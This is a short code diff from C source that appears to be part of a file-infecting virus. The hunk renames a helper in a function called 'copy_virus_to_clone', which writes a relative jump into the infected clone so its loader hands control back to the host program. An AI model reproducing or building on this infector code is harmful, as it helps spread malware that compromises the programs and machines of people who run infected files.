@@ -41,7 +41,7 @@ bool		copy_virus_to_clone(struct safe_ptr clone_ref,
 	// write new addr into clone's loader code
 	const size_t	back_to_client_jump_offset = back_to_client_jump - clone_ref.ptr;
 
-	write_jump32(clone_ref, back_to_client_jump_offset, rel_jump_client);
+	write_jmp32(clone_ref, back_to_client_jump_offset, rel_jump_client);
 
 	return true;
 }
